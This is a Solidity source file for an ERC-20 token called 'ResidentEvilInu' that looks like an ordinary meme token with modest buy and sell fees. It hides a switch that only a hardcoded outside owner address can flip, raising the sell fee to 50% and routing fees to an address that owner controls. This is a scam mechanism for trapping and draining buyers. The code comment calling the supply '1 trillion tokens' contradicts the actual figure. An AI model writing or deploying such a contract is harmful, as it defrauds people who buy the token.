// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract ResidentEvilInu is IERC20 {
    // Basic token setup
    string public name = "ResidentEvilInu";
    string public symbol = "REI";
    uint8 public decimals = 18;
    uint256 public totalSupply = 1000000000 * (10 ** uint256(decimals));  // 1 trillion tokens

    // Fee setup
    uint256 public buyFee = 200;  // 2%
    uint256 public sellFee = 500;  // 5%
    bool public sellFeeUp = false;  // Variable to set high sell fee

    address public feeRecipient;  // Address where fees are sent
    address public contractOwner = 0x63A67AF0936f247049db7b2261052D069EDC68b8;  // Hardcoded contract owner

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    constructor() {
        _balances[msg.sender] = totalSupply;
        feeRecipient = msg.sender;
        
        emit Transfer(address(0), msg.sender, totalSupply);
    }
    
    function setSellFeeUpState(bool state) external {
        require(msg.sender == contractOwner, "Only the contract owner can change this");
        sellFeeUp = state;
    }

    function getSellFeeUpState() external view returns (bool) {
        return sellFeeUp;
    }
    
    function setFeeRecipient(address newFeeRecipient) external {
        require(msg.sender == contractOwner, "Only the contract owner can change this");
        feeRecipient = newFeeRecipient;
    }

    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, msg.sender, currentAllowance - amount);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(_balances[sender] >= amount, "ERC20: transfer amount exceeds balance");

        uint256 fee = 0;
        uint256 appliedSellFee = sellFeeUp ? 5000 : sellFee;  // Use high fee if sellFeeUp is true

        if (sender == feeRecipient) {
            fee = (amount * buyFee) / 10000;
        } else if (recipient == feeRecipient) {
            fee = (amount * appliedSellFee) / 10000;
        }

        uint256 transferAmount = amount - fee;
        
        _balances[sender] -= amount;
        _balances[recipient] += transferAmount;
        _balances[feeRecipient] += fee;
        
        emit Transfer(sender, recipient, transferAmount);
        if (fee > 0) {
            emit Transfer(sender, feeRecipient, fee);
        }
    }

    function _approve(address owner, address spender, uint256 amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}